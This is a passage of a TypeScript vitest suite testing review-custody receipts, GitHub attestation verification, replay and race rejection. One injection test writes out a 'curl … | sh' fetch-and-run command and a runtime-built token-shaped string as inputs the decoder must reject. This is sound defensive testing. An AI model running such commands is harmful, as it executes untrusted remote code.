import { createHash } from "node:crypto";
import { describe, expect, it } from "vitest";
import { createGhAttestationVerifier } from "../src/feedback/adapters/gh-attestation-verifier.ts";
import type {
  GitHubAttestationQuery,
  GitHubAttestationVerification,
  GitHubAttestationVerifierPort,
} from "../src/feedback/ports/github-attestation-verifier.ts";
import type { VerifiedProviderIdentity } from "../src/feedback/ports/provider-family-authority.ts";
import {
  admitReviewCustody,
  buildReviewCustodyReceipt,
  type CustodyAdmissionInput,
  type CustodyObservations,
  type CustodyPullRequestFacts,
  type CustodyReceiptDraft,
  type CustodySubjectExpectation,
  decodeReviewCustodyReceipt,
  REVIEW_CUSTODY_SCHEMA_VERSION,
} from "../src/feedback/review-custody.ts";
import {
  canonicalize,
  computeReviewRevision,
  type ReviewRequestIdentity,
  sha256Hex,
} from "../src/feedback/review-custody-canonical.ts";
import {
  issueCustodyReceipt,
  type RunnerEnvironment,
} from "../src/feedback/review-custody-runner.ts";
import { analyzeReviewDispatch } from "../src/feedback/review-dispatch.ts";

const REPOSITORY = "unison-ai-product/UT-TDD_AGENT-HARNESS";
const HEAD = "a".repeat(40);
const OTHER_HEAD = "b".repeat(40);
const WORKFLOW_SHA = "c".repeat(40);
const MERGE_SHA = "d".repeat(40);
const MERGED_AT = "2026-08-07T07:28:00Z";
const PLAN_REVISION = "1".repeat(64);
const JUDGMENT_DIGEST = "2".repeat(64);
const PROVIDER_EVIDENCE_REF = `d3b:${"3".repeat(64)}`;
const WORKFLOW_REF = `${REPOSITORY}/.github/workflows/review-attestation.yml@refs/heads/main`;
const ISSUER = "https://token.actions.githubusercontent.com";
const RUN_ID = "17123456789";

const REQUEST_IDENTITY: ReviewRequestIdentity = {
  schemaVersion: "review-request/v1",
  memoryId: "project-review-pr-283-exact-head",
  pr: 283,
  exactHead: HEAD,
  authorFamily: "claude",
};

function draft(overrides: Partial<CustodyReceiptDraft> = {}): CustodyReceiptDraft {
  return {
    receiptKind: "pre_merge_review",
    repository: REPOSITORY,
    prNumber: 283,
    baseRef: "main",
    headSha: HEAD,
    planId: "PLAN-L7-465-cross-review-author-binding",
    planRevision: PLAN_REVISION,
    requestIdentity: REQUEST_IDENTITY,
    judgmentDigest: JUDGMENT_DIGEST,
    workflowRef: WORKFLOW_REF,
    workflowSha: WORKFLOW_SHA,
    runId: RUN_ID,
    runAttempt: 1,
    issuer: ISSUER,
    providerEvidenceRef: PROVIDER_EVIDENCE_REF,
    reviewerFamily: "codex",
    authorFamily: "claude",
    verdict: "PASS",
    blockingFindingCount: 0,
    ...overrides,
  };
}

function buildText(overrides: Partial<CustodyReceiptDraft> = {}): string {
  const built = buildReviewCustodyReceipt({ draft: draft(overrides), attempts: 3 });
  if (!built.ok) throw new Error(`fixture receipt build failed: ${built.detail}`);
  return built.text;
}

function prFacts(overrides: Partial<CustodyPullRequestFacts> = {}): CustodyPullRequestFacts {
  return {
    repository: REPOSITORY,
    prNumber: 283,
    baseRef: "main",
    headSha: HEAD,
    state: "OPEN",
    mergeSha: null,
    mergedAt: null,
    ...overrides,
  };
}

function observations(overrides: Partial<CustodyObservations> = {}): CustodyObservations {
  return {
    eventPayload: prFacts(),
    apiRead1: prFacts(),
    apiRead2: prFacts(),
    run: {
      repository: REPOSITORY,
      runId: RUN_ID,
      runAttempt: 1,
      workflowRef: WORKFLOW_REF,
      workflowSha: WORKFLOW_SHA,
      headSha: HEAD,
      status: "completed",
      conclusion: "success",
    },
    ...overrides,
  };
}

function expectation(
  overrides: Partial<CustodySubjectExpectation> = {},
): CustodySubjectExpectation {
  return {
    repository: REPOSITORY,
    prNumber: 283,
    baseRef: "main",
    headSha: HEAD,
    receiptKind: "pre_merge_review",
    planId: "PLAN-L7-465-cross-review-author-binding",
    planRevision: PLAN_REVISION,
    requestIdentity: REQUEST_IDENTITY,
    judgmentDigest: JUDGMENT_DIGEST,
    workflowRef: WORKFLOW_REF,
    issuer: ISSUER,
    ...overrides,
  };
}

function acceptingVerifier(overrides: Partial<GitHubAttestationFactsShape> = {}): {
  port: GitHubAttestationVerifierPort;
  queries: GitHubAttestationQuery[];
} {
  const queries: GitHubAttestationQuery[] = [];
  const port: GitHubAttestationVerifierPort = {
    verify(query) {
      queries.push(query);
      return Promise.resolve({
        ok: true,
        facts: {
          repository: REPOSITORY,
          workflowRef: WORKFLOW_REF,
          workflowSha: WORKFLOW_SHA,
          runId: RUN_ID,
          runAttempt: 1,
          issuer: ISSUER,
          subjectDigests: [query.artifactDigest],
          ...overrides,
        },
      });
    },
  };
  return { port, queries };
}

interface GitHubAttestationFactsShape {
  repository: string;
  workflowRef: string;
  workflowSha: string;
  runId: string;
  runAttempt: number;
  issuer: string;
  subjectDigests: readonly string[];
}

function rejectingVerifier(
  reason: "missing" | "signature_unverified" | "signer_mismatch" | "audit_unavailable",
): { port: GitHubAttestationVerifierPort; calls: () => number } {
  let calls = 0;
  const port: GitHubAttestationVerifierPort = {
    verify(): Promise<GitHubAttestationVerification> {
      calls += 1;
      return Promise.resolve({ ok: false, reason });
    },
  };
  return { port, calls: () => calls };
}

const APPROVED_IDENTITY: VerifiedProviderIdentity = {
  kind: "verified_provider_identity",
  family: "codex",
  repository: REPOSITORY,
  prNumber: 283,
  headSha: HEAD,
  authority: "po-approved-provider-oidc-subject",
};

function admissionInput(overrides: Partial<CustodyAdmissionInput> = {}): CustodyAdmissionInput {
  return {
    receiptText: buildText(),
    receiptPath: "review-custody-receipt.json",
    expected: expectation(),
    observations: observations(),
    authority: { attestationVerifier: acceptingVerifier().port, providerIdentity: null },
    ...overrides,
  };
}

function runnerEnvironment(input: {
  readonly pullRequest: Record<string, unknown>;
  readonly mergeMethod?: string;
}): { env: RunnerEnvironment; written: () => string | null } {
  const values: Record<string, string> = {
    GITHUB_REPOSITORY: REPOSITORY,
    UT_TDD_CUSTODY_PR: "283",
    UT_TDD_CUSTODY_PLAN_ID: "PLAN-L7-465",
    UT_TDD_CUSTODY_PLAN_REVISION: PLAN_REVISION,
    UT_TDD_CUSTODY_MEMORY_ID: REQUEST_IDENTITY.memoryId,
    UT_TDD_CUSTODY_JUDGMENT_DIGEST: JUDGMENT_DIGEST,
    UT_TDD_CUSTODY_PROVIDER_EVIDENCE_REF: PROVIDER_EVIDENCE_REF,
    UT_TDD_CUSTODY_REVIEWER_FAMILY: "codex",
    UT_TDD_CUSTODY_AUTHOR_FAMILY: "claude",
    UT_TDD_CUSTODY_VERDICT: "PASS",
    GITHUB_WORKFLOW_REF: WORKFLOW_REF,
    GITHUB_SHA: WORKFLOW_SHA,
    GITHUB_RUN_ID: RUN_ID,
    GITHUB_RUN_ATTEMPT: "1",
    UT_TDD_CUSTODY_RECEIPT_PATH: "review-custody-receipt.json",
  };
  if (input.mergeMethod !== undefined) values.UT_TDD_CUSTODY_MERGE_METHOD = input.mergeMethod;
  const stdout = JSON.stringify(input.pullRequest);
  let output: string | null = null;
  return {
    env: {
      get: (name) => values[name],
      runGh: () => ({ status: 0, stdout }),
      readFile: () => {
        throw new Error("not used by issue");
      },
      writeFile: (_path, content) => {
        output = content;
      },
      log: () => undefined,
    },
    written: () => output,
  };
}

function runnerPullRequest(input: {
  readonly merged: boolean;
  readonly mergedAt?: string;
}): Record<string, unknown> {
  return {
    number: 283,
    state: input.merged ? "closed" : "open",
    merged: input.merged,
    merged_at: input.mergedAt ?? null,
    merge_commit_sha: input.merged ? MERGE_SHA : null,
    base: { ref: "main" },
    head: { sha: HEAD, repo: { full_name: REPOSITORY } },
  };
}

describe("D3 trusted custody receipt", () => {
  it("U-RVGHA-D3C-001: 機械 custody が全て valid でも family authority 不在なら unverified_family で custody_admitted を出さない", async () => {
    const decision = await admitReviewCustody(admissionInput());
    expect(decision).toEqual({
      state: "custody_rejected",
      reasons: ["unverified_family"],
      details: ["provider_family_authority_absent"],
    });
  });

  it("U-RVGHA-D3C-017: 承認済み VerifiedProviderIdentity と全検証 green のときだけ typed custody_admitted を返す", async () => {
    const decision = await admitReviewCustody(
      admissionInput({
        authority: {
          attestationVerifier: acceptingVerifier().port,
          providerIdentity: APPROVED_IDENTITY,
        },
      }),
    );
    expect(decision.state).toBe("custody_admitted");
    if (decision.state !== "custody_admitted") return;
    expect(decision.repository).toBe(REPOSITORY);
    expect(decision.prNumber).toBe(283);
    expect(decision.headSha).toBe(HEAD);
    expect(decision.runId).toBe(RUN_ID);
    expect(decision.runAttempt).toBe(1);
    expect(decision.issuer).toBe(ISSUER);
    expect(decision.judgmentDigest).toBe(JUDGMENT_DIGEST);
    expect(decision.reviewRevision).toMatch(/^rv1-[0-9a-f]{64}$/);
    expect(decision.artifactDigest).toBe(sha256Hex(buildText()));
    expect(decision.familyAuthority).toBe("po-approved-provider-oidc-subject");
  });

  it("U-RVGHA-D3C-002: repository / PR / baseRef / headSha / planRevision / reviewRevision の 1 軸変異を全件 replay 拒否する", async () => {
    const mutations: CustodySubjectExpectation[] = [
      expectation({ repository: "attacker/UT-TDD_AGENT-HARNESS" }),
      expectation({ prNumber: 284 }),
      expectation({ baseRef: "release" }),
      expectation({ headSha: OTHER_HEAD }),
      expectation({ planRevision: "9".repeat(64) }),
      expectation({
        requestIdentity: { ...REQUEST_IDENTITY, memoryId: "project-other-review-request" },
      }),
    ];
    const decisions = await Promise.all(
      mutations.map((expected) =>
        admitReviewCustody(
          admissionInput({
            expected,
            authority: {
              attestationVerifier: acceptingVerifier().port,
              providerIdentity: APPROVED_IDENTITY,
            },
          }),
        ),
      ),
    );
    expect(decisions.map((decision) => decision.state)).toEqual(
      mutations.map(() => "custody_rejected"),
    );
    for (const decision of decisions) {
      expect(decision.state === "custody_rejected" && decision.reasons).toEqual([
        "identity_mismatch",
      ]);
    }
  });

  it("U-RVGHA-D3C-003: unknown field / 必須 field 欠落 / 型違い / schemaVersion 差替えを strict decode で receipt_corrupt にする", () => {
    const valid = JSON.parse(buildText()) as Record<string, unknown>;
    const corrupted: Record<string, unknown>[] = [
      { ...valid, extraField: "unexpected" },
      Object.fromEntries(Object.entries(valid).filter(([key]) => key !== "issuer")),
      { ...valid, prNumber: "283" },
      { ...valid, schemaVersion: "review-custody/v2" },
    ];
    const outcomes = corrupted.map((entry) => decodeReviewCustodyReceipt(JSON.stringify(entry)));
    expect(outcomes.map((outcome) => outcome.ok)).toEqual([false, false, false, false]);
    for (const outcome of outcomes) {
      expect(outcome.ok === false && outcome.reason).toBe("receipt_corrupt");
    }
    expect(decodeReviewCustodyReceipt("{not json").ok).toBe(false);
    expect(decodeReviewCustodyReceipt(REVIEW_CUSTODY_SCHEMA_VERSION).ok).toBe(false);
  });

  it("U-RVGHA-D3C-004: reviewerFamily の自己申告を trusted へ昇格せず unverified_family にする", async () => {
    const decision = await admitReviewCustody(
      admissionInput({
        receiptText: buildText({ reviewerFamily: "claude" }),
        authority: { attestationVerifier: acceptingVerifier().port, providerIdentity: null },
      }),
    );
    expect(decision).toEqual({
      state: "custody_rejected",
      reasons: ["unverified_family"],
      details: ["provider_family_authority_absent"],
    });
    const mismatched = await admitReviewCustody(
      admissionInput({
        receiptText: buildText({ reviewerFamily: "claude" }),
        authority: {
          attestationVerifier: acceptingVerifier().port,
          providerIdentity: APPROVED_IDENTITY,
        },
      }),
    );
    expect(mismatched).toEqual({
      state: "custody_rejected",
      reasons: ["unverified_family"],
      details: ["provider_family_identity_not_bound_to_subject"],
    });
  });

  it("U-RVGHA-D3C-005: attestation だけ / D3b payload だけの片面では custody_admitted を出さない", async () => {
    const attestationOnly = await admitReviewCustody(
      admissionInput({
        receiptText: JSON.stringify(
          Object.fromEntries(
            Object.entries(JSON.parse(buildText()) as Record<string, unknown>).filter(
              ([key]) => key !== "providerEvidenceRef",
            ),
          ),
        ),
        authority: {
          attestationVerifier: acceptingVerifier().port,
          providerIdentity: APPROVED_IDENTITY,
        },
      }),
    );
    expect(attestationOnly).toEqual({
      state: "custody_rejected",
      reasons: ["receipt_corrupt"],
      details: ["receipt_field_set_mismatch"],
    });
    const payloadOnly = await admitReviewCustody(
      admissionInput({
        authority: {
          attestationVerifier: rejectingVerifier("missing").port,
          providerIdentity: APPROVED_IDENTITY,
        },
      }),
    );
    expect(payloadOnly).toEqual({
      state: "custody_rejected",
      reasons: ["missing"],
      details: ["attestation_missing"],
    });
  });

  it("U-RVGHA-D3C-006: event payload と API read 1 の repo / PR / base / head 変異を発行 0 にする", async () => {
    const mutations: CustodyPullRequestFacts[] = [
      prFacts({ repository: "fork/UT-TDD_AGENT-HARNESS" }),
      prFacts({ prNumber: 284 }),
      prFacts({ baseRef: "release" }),
      prFacts({ headSha: OTHER_HEAD }),
    ];
    const decisions = await Promise.all(
      mutations.map((eventPayload) =>
        admitReviewCustody(
          admissionInput({
            observations: observations({ eventPayload }),
            authority: {
              attestationVerifier: acceptingVerifier().port,
              providerIdentity: APPROVED_IDENTITY,
            },
          }),
        ),
      ),
    );
    expect(decisions.map((decision) => decision.state)).toEqual(
      mutations.map(() => "custody_rejected"),
    );
    for (const decision of decisions) {
      const reason = decision.state === "custody_rejected" ? decision.reasons[0] : "custody";
      expect(["head_raced", "identity_mismatch"]).toContain(reason);
    }
  });

  it("U-RVGHA-D3C-007: API read 1 の後・read 2 の前に HEAD / state が変わった TOCTOU を head_raced で拒否する", async () => {
    const headMoved = await admitReviewCustody(
      admissionInput({
        observations: observations({ apiRead2: prFacts({ headSha: OTHER_HEAD }) }),
        authority: {
          attestationVerifier: acceptingVerifier().port,
          providerIdentity: APPROVED_IDENTITY,
        },
      }),
    );
    expect(headMoved).toEqual({
      state: "custody_rejected",
      reasons: ["head_raced"],
      details: ["api_read_1_disagrees_with_api_read_2"],
    });
    const stateMoved = await admitReviewCustody(
      admissionInput({
        observations: observations({
          apiRead2: prFacts({ state: "MERGED", mergeSha: MERGE_SHA }),
        }),
        authority: {
          attestationVerifier: acceptingVerifier().port,
          providerIdentity: APPROVED_IDENTITY,
        },
      }),
    );
    expect(stateMoved.state === "custody_rejected" && stateMoved.reasons).toEqual(["head_raced"]);
  });

  it("U-RVGHA-D3C-008: fork / 別 repo / 別 PR、pre receipt への merged fact、post receipt の mergeSha 欠落を kind 不整合として拒否する", async () => {
    const mergedUnderPre = await admitReviewCustody(
      admissionInput({
        observations: observations({
          eventPayload: prFacts({ state: "MERGED", mergeSha: MERGE_SHA }),
          apiRead1: prFacts({ state: "MERGED", mergeSha: MERGE_SHA }),
          apiRead2: prFacts({ state: "MERGED", mergeSha: MERGE_SHA }),
        }),
        authority: {
          attestationVerifier: acceptingVerifier().port,
          providerIdentity: APPROVED_IDENTITY,
        },
      }),
    );
    expect(mergedUnderPre).toEqual({
      state: "custody_rejected",
      reasons: ["identity_mismatch"],
      details: ["pre_merge_requires_open_pull_request"],
    });

    const postWithoutMergeSha = buildReviewCustodyReceipt({
      draft: draft({ receiptKind: "post_merge_closure", mergeMethod: "squash" }),
      attempts: 3,
    });
    expect(postWithoutMergeSha.ok).toBe(false);
    expect(postWithoutMergeSha.ok === false && postWithoutMergeSha.reason).toBe("receipt_corrupt");

    const postClosureText = buildText({
      receiptKind: "post_merge_closure",
      mergeSha: MERGE_SHA,
      mergeMethod: "squash",
      mergedAt: MERGED_AT,
    });
    const postClosure = await admitReviewCustody(
      admissionInput({
        receiptText: postClosureText,
        expected: expectation({ receiptKind: "post_merge_closure", mergeMethod: "squash" }),
        observations: observations({
          eventPayload: prFacts({ state: "MERGED", mergeSha: MERGE_SHA, mergedAt: MERGED_AT }),
          apiRead1: prFacts({ state: "MERGED", mergeSha: MERGE_SHA, mergedAt: MERGED_AT }),
          apiRead2: prFacts({ state: "MERGED", mergeSha: MERGE_SHA, mergedAt: MERGED_AT }),
        }),
        authority: {
          attestationVerifier: acceptingVerifier().port,
          providerIdentity: null,
        },
      }),
    );
    expect(postClosure).toEqual({
      state: "custody_rejected",
      reasons: ["unverified_family"],
      details: ["provider_family_authority_absent"],
    });

    const postTimestampDrift = await admitReviewCustody(
      admissionInput({
        receiptText: postClosureText,
        expected: expectation({ receiptKind: "post_merge_closure", mergeMethod: "squash" }),
        observations: observations({
          eventPayload: prFacts({
            state: "MERGED",
            mergeSha: MERGE_SHA,
            mergedAt: "2026-08-07T07:29:00Z",
          }),
          apiRead1: prFacts({
            state: "MERGED",
            mergeSha: MERGE_SHA,
            mergedAt: "2026-08-07T07:29:00Z",
          }),
          apiRead2: prFacts({
            state: "MERGED",
            mergeSha: MERGE_SHA,
            mergedAt: "2026-08-07T07:29:00Z",
          }),
        }),
        authority: {
          attestationVerifier: acceptingVerifier().port,
          providerIdentity: null,
        },
      }),
    );
    expect(postTimestampDrift).toEqual({
      state: "custody_rejected",
      reasons: ["identity_mismatch"],
      details: ["post_merge_timestamp_mismatch"],
    });

    const postMergeMethodMismatch = await admitReviewCustody(
      admissionInput({
        receiptText: postClosureText,
        expected: expectation({ receiptKind: "post_merge_closure", mergeMethod: "rebase" }),
        observations: observations({
          eventPayload: prFacts({ state: "MERGED", mergeSha: MERGE_SHA, mergedAt: MERGED_AT }),
          apiRead1: prFacts({ state: "MERGED", mergeSha: MERGE_SHA, mergedAt: MERGED_AT }),
          apiRead2: prFacts({ state: "MERGED", mergeSha: MERGE_SHA, mergedAt: MERGED_AT }),
        }),
      }),
    );
    expect(postMergeMethodMismatch).toEqual({
      state: "custody_rejected",
      reasons: ["identity_mismatch"],
      details: ["subject_field_mismatch:mergeMethod"],
    });

    const forkSubject = await admitReviewCustody(
      admissionInput({
        receiptText: buildText({ repository: "fork/UT-TDD_AGENT-HARNESS" }),
        authority: {
          attestationVerifier: acceptingVerifier().port,
          providerIdentity: APPROVED_IDENTITY,
        },
      }),
    );
    expect(forkSubject.state === "custody_rejected" && forkSubject.reasons).toEqual([
      "identity_mismatch",
    ]);
  });

  it("U-RVGHA-D3C-009: CI evidence の失敗系は D1 merge_ready を 0 にするが、正規 receipt の custody 判定を変えない", async () => {
    const request = {
      memoryId: REQUEST_IDENTITY.memoryId,
      pr: 283,
      exactHead: HEAD,
      reviewRevision: "rev-1",
      authorFamily: "claude" as const,
      requestedAt: "2026-08-07T00:00:00Z",
    };
    const receipt = {
      memoryId: REQUEST_IDENTITY.memoryId,
      pr: 283,
      head: HEAD,
      reviewRevision: "rev-1",
      reviewerFamily: "codex" as const,
      kind: "verdict" as const,
      verdict: "PASS" as const,
      at: "2026-08-07T00:10:00Z",
    };
    const dispatched = analyzeReviewDispatch({
      requests: [request],
      receipts: [receipt],
      prs: [{ pr: 283, headSha: HEAD, state: "OPEN", checksGreen: false }],
      now: "2026-08-07T00:20:00Z",
    });
    expect(dispatched.entries.map((entry) => entry.state)).not.toContain("merge_ready");

    const custody = await admitReviewCustody(
      admissionInput({
        authority: {
          attestationVerifier: acceptingVerifier().port,
          providerIdentity: APPROVED_IDENTITY,
        },
      }),
    );
    expect(custody.state).toBe("custody_admitted");
  });

  it("U-RVGHA-D3C-011: attestation 不在 / 署名不正 / issuer 不一致 / 取得不能を typed に区別する", async () => {
    const cases = [
      { reason: "missing" as const, detail: "attestation_missing" },
      { reason: "signature_unverified" as const, detail: "attestation_signature_unverified" },
      { reason: "signer_mismatch" as const, detail: "attestation_signer_mismatch" },
      { reason: "audit_unavailable" as const, detail: "attestation_audit_unavailable" },
    ];
    for (const entry of cases) {
      const decision = await admitReviewCustody(
        admissionInput({
          authority: {
            attestationVerifier: rejectingVerifier(entry.reason).port,
            providerIdentity: APPROVED_IDENTITY,
          },
        }),
      );
      expect(decision).toEqual({
        state: "custody_rejected",
        reasons: [entry.reason],
        details: [entry.detail],
      });
    }
    const factsDrift = await admitReviewCustody(
      admissionInput({
        authority: {
          attestationVerifier: acceptingVerifier({ runId: "999" }).port,
          providerIdentity: APPROVED_IDENTITY,
        },
      }),
    );
    expect(factsDrift).toEqual({
      state: "custody_rejected",
      reasons: ["signer_mismatch"],
      details: ["attestation_facts_disagree_with_receipt"],
    });
  });

  it("U-RVGHA-D3C-012: 同一 subject + 同一 content の再送は同一 digest で冪等、tuple 変更 receipt は replay 拒否する", async () => {
    const first = buildReviewCustodyReceipt({ draft: draft(), attempts: 3 });
    const second = buildReviewCustodyReceipt({ draft: draft(), attempts: 3 });
    expect(first.ok && second.ok && first.text).toBe(second.ok ? second.text : "");
    expect(first.ok && second.ok && first.artifactDigest).toBe(
      second.ok ? second.artifactDigest : "",
    );

    const otherPr = buildReviewCustodyReceipt({
      draft: draft({
        prNumber: 284,
        requestIdentity: { ...REQUEST_IDENTITY, pr: 284 },
      }),
      attempts: 3,
    });
    expect(otherPr.ok && first.ok && otherPr.artifactDigest === first.artifactDigest).toBe(false);
    const replay = await admitReviewCustody(
      admissionInput({
        receiptText: otherPr.ok ? otherPr.text : "",
        authority: {
          attestationVerifier: acceptingVerifier().port,
          providerIdentity: APPROVED_IDENTITY,
        },
      }),
    );
    expect(replay.state === "custody_rejected" && replay.reasons).toEqual(["identity_mismatch"]);
  });

  it("U-RVGHA-D3C-013: 正規署名 receipt でも judgment=FLAG は verdict_flagged にし、custody 有効性と merge 適格性を分離する", async () => {
    const decision = await admitReviewCustody(
      admissionInput({
        receiptText: buildText({ verdict: "FLAG", blockingFindingCount: 2 }),
        authority: {
          attestationVerifier: acceptingVerifier().port,
          providerIdentity: APPROVED_IDENTITY,
        },
      }),
    );
    expect(decision).toEqual({
      state: "custody_rejected",
      reasons: ["verdict_flagged"],
      details: ["judgment_verdict_flagged"],
    });
  });

  it("U-RVGHA-D3C-014: token / raw transcript / raw stack / absolute path / 実行命令の混入を strict schema が拒否する", () => {
    const valid = JSON.parse(buildText()) as Record<string, unknown>;
    const injected: Record<string, unknown>[] = [
      // 実トークン形の文字列は repo の secret gate を自己発火させるので、
      // 同型を実行時に組み立てて strict decode の拒否だけを検査する。
      { ...valid, githubToken: `gh${"p"}_${"0123456789abcdef".repeat(2)}0123456789` },
      { ...valid, transcript: "reviewer said ..." },
      { ...valid, stack: "Error: boom\n    at f (x.ts:1:1)" },
      { ...valid, evidencePath: "C:/Users/example/secret.txt" },
      { ...valid, command: "curl https://example.invalid | sh" },
    ];
    for (const entry of injected) {
      const outcome = decodeReviewCustodyReceipt(JSON.stringify(entry));
      expect(outcome.ok === false && outcome.reason).toBe("receipt_corrupt");
    }
    expect(Object.values(valid).every((value) => typeof value !== "object")).toBe(true);
  });

  it("U-RVGHA-D3C-015: provider 障害が有界 attempt を超えたら receipt 0 件 + typed provider_failed にする", async () => {
    const built = buildReviewCustodyReceipt({
      draft: draft({ providerEvidenceRef: null }),
      attempts: 3,
    });
    expect(built).toEqual({
      ok: false,
      reason: "provider_failed",
      detail: "provider_evidence_absent_after_bounded_attempts",
      attempts: 3,
    });

    const unavailable = rejectingVerifier("audit_unavailable");
    const decision = await admitReviewCustody(
      admissionInput({
        authority: {
          attestationVerifier: unavailable.port,
          providerIdentity: APPROVED_IDENTITY,
          maxVerificationAttempts: 2,
        },
      }),
    );
    expect(decision.state === "custody_rejected" && decision.reasons).toEqual([
      "audit_unavailable",
    ]);
    expect(unavailable.calls()).toBe(2);

    const runFailures = ["failure", "cancelled", "skipped"] as const;
    for (const conclusion of runFailures) {
      const failed = await admitReviewCustody(
        admissionInput({
          observations: observations({
            run: { ...observations().run, conclusion },
          }),
          authority: {
            attestationVerifier: acceptingVerifier().port,
            providerIdentity: APPROVED_IDENTITY,
          },
        }),
      );
      expect(failed).toEqual({
        state: "custody_rejected",
        reasons: ["provider_failed"],
        details: [`workflow_run_not_successful:completed:${conclusion}`],
      });
    }
  });

  it("U-RVGHA-D3C-016: custody_admitted は CI / merge 由来 field を持たず、merge_ready の第二 SSoT にならない", async () => {
    const decision = await admitReviewCustody(
      admissionInput({
        authority: {
          attestationVerifier: acceptingVerifier().port,
          providerIdentity: APPROVED_IDENTITY,
        },
      }),
    );
    expect(decision.state).toBe("custody_admitted");
    expect(Object.keys(decision).sort()).toEqual(
      [
        "artifactDigest",
        "familyAuthority",
        "headSha",
        "issuer",
        "judgmentDigest",
        "prNumber",
        "receiptDigest",
        "receiptKind",
        "repository",
        "reviewRevision",
        "reviewerFamily",
        "runAttempt",
        "runId",
        "state",
        "workflowRef",
        "workflowSha",
      ].sort(),
    );
  });

  it("U-RVGHA-D3C-018: RFC 8785 preimage は key 順・locale に依存せず 64 lowerhex で一致し、既存 16 桁 digest を拒否する", () => {
    const keyOrderA = canonicalize({ b: 1, a: "x", c: [1, 2] });
    const keyOrderB = canonicalize({ c: [1, 2], a: "x", b: 1 });
    expect(keyOrderA).toEqual({ ok: true, value: '{"a":"x","b":1,"c":[1,2]}' });
    expect(keyOrderB).toEqual(keyOrderA);

    // locale 照合では "a" < "B" になるが、JCS は UTF-16 code unit 順なので "B" が先に来る。
    expect(canonicalize({ a: 1, B: 2 })).toEqual({ ok: true, value: '{"B":2,"a":1}' });
    expect(["a", "B"].sort((left, right) => left.localeCompare(right))).toEqual(["a", "B"]);

    const identityCanonical =
      '{"authorFamily":"claude","exactHead":"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",' +
      '"memoryId":"project-review-pr-283-exact-head","pr":283,"schemaVersion":"review-request/v1"}';
    const independentDigest = createHash("sha256").update(identityCanonical, "utf8").digest("hex");
    const revision = computeReviewRevision(REQUEST_IDENTITY);
    expect(revision).toEqual({ ok: true, value: `rv1-${independentDigest}` });
    expect(independentDigest).toHaveLength(64);

    const receipt = JSON.parse(buildText()) as Record<string, unknown>;
    expect(String(receipt.receiptDigest)).toHaveLength(64);
    const truncated = { ...receipt, receiptDigest: String(receipt.receiptDigest).slice(0, 16) };
    expect(decodeReviewCustodyReceipt(JSON.stringify(truncated)).ok).toBe(false);
    const wellFormedButWrong = { ...receipt, receiptDigest: "f".repeat(64) };
    const outcome = decodeReviewCustodyReceipt(JSON.stringify(wellFormedButWrong));
    expect(outcome.ok === false && outcome.reason).toBe("identity_mismatch");
    expect(canonicalize({ n: 1.5 })).toEqual({ ok: false, reason: "canonical_unsupported_value" });
  });
});

/**
 * adapter の入出力は**実測した `gh attestation verify --format=json` 出力**で固定する。
 *
 * 実測 (2026-08-07、gh 2.87.3):
 *   `gh attestation verify gh_2.97.0_windows_arm64.zip --repo cli/cli --format json`
 * 出力は `[{attestation, verificationResult}]` で、`verificationResult.signature.certificate` に
 * 下記 fixture の field が、`verificationResult.statement.subject` に `{name, digest:{sha256}}` の
 * 配列が入る。この形を推測で書くと live で `audit_unavailable` に落ちるため、実出力を写す。
 */
describe("D3 attestation verifier adapter", () => {
  const ARTIFACT_DIGEST = "e".repeat(64);
  const OTHER_DIGEST = "f".repeat(64);
  const CLI_REPOSITORY = "cli/cli";
  const CLI_WORKFLOW_REF = "cli/cli/.github/workflows/deployment.yml@refs/heads/trunk";
  const CLI_WORKFLOW_SHA = "55dbb4dc6b7edb10b48e3d7fc5bccd32318d1b55";

  function measuredOutput(digests: readonly string[]): string {
    return JSON.stringify([
      {
        attestation: { bundleUrl: "https://api.github.com/…" },
        verificationResult: {
          mediaType: "application/vnd.dev.sigstore.bundle.v0.3+json",
          signature: {
            certificate: {
              certificateIssuer: "CN=sigstore-intermediate,O=sigstore.dev",
              subjectAlternativeName: `https://github.com/${CLI_WORKFLOW_REF}`,
              issuer: ISSUER,
              githubWorkflowSHA: CLI_WORKFLOW_SHA,
              buildSignerURI: `https://github.com/${CLI_WORKFLOW_REF}`,
              buildSignerDigest: CLI_WORKFLOW_SHA,
              runnerEnvironment: "github-hosted",
              sourceRepositoryURI: `https://github.com/${CLI_REPOSITORY}`,
              runInvocationURI: `https://github.com/${CLI_REPOSITORY}/actions/runs/30597407850/attempts/1`,
            },
          },
          statement: {
            _type: "https://in-toto.io/Statement/v1",
            predicateType: "https://slsa.dev/provenance/v1",
            subject: digests.map((digest, index) => ({
              name: `artifact-${index}`,
              digest: { sha256: digest },
            })),
          },
        },
      },
    ]);
  }

  function query(): GitHubAttestationQuery {
    return {
      artifactDigest: ARTIFACT_DIGEST,
      artifactPath: "review-custody-receipt.json",
      repository: CLI_REPOSITORY,
      expectedWorkflowRef: CLI_WORKFLOW_REF,
      expectedIssuer: ISSUER,
    };
  }

  it("U-RVGHA-D3C-011: 実測形の出力を receipt field 形へ正規化し、subject を positional path で問い合わせる (--digest は存在しない)", async () => {
    const calls: (readonly string[])[] = [];
    const verifier = createGhAttestationVerifier({
      runCommand: (args) => {
        calls.push(args);
        return { status: 0, stdout: measuredOutput([OTHER_DIGEST, ARTIFACT_DIGEST]) };
      },
    });
    const result = await verifier.verify(query());
    expect(result).toEqual({
      ok: true,
      facts: {
        repository: CLI_REPOSITORY,
        workflowRef: CLI_WORKFLOW_REF,
        workflowSha: CLI_WORKFLOW_SHA,
        runId: "30597407850",
        runAttempt: 1,
        issuer: ISSUER,
        subjectDigests: [OTHER_DIGEST, ARTIFACT_DIGEST],
      },
    });
    expect(calls).toHaveLength(1);
    expect(calls[0]).toEqual([
      "attestation",
      "verify",
      "review-custody-receipt.json",
      `--repo=${CLI_REPOSITORY}`,
      "--signer-workflow=cli/cli/.github/workflows/deployment.yml",
      `--cert-oidc-issuer=${ISSUER}`,
      "--format=json",
    ]);
    expect(calls[0].some((arg) => arg.startsWith("--digest="))).toBe(false);
  });

  it("U-RVGHA-D3C-011: 対象 digest を被覆しない statement を成功へ丸めず missing にする", async () => {
    const verifier = createGhAttestationVerifier({
      runCommand: () => ({ status: 0, stdout: measuredOutput([OTHER_DIGEST]) }),
    });
    expect(await verifier.verify(query())).toEqual({ ok: false, reason: "missing" });
  });

  it("U-RVGHA-D3C-011: exit / 出力の各異常を typed reason へ落とし、判定不能を成功にしない", async () => {
    const cases: Array<{ result: { status: number | null; stdout: string }; reason: string }> = [
      // 実測: 未知フラグや不在は exit 1 + stdout 空。usage error を「不在」以上に解釈しない。
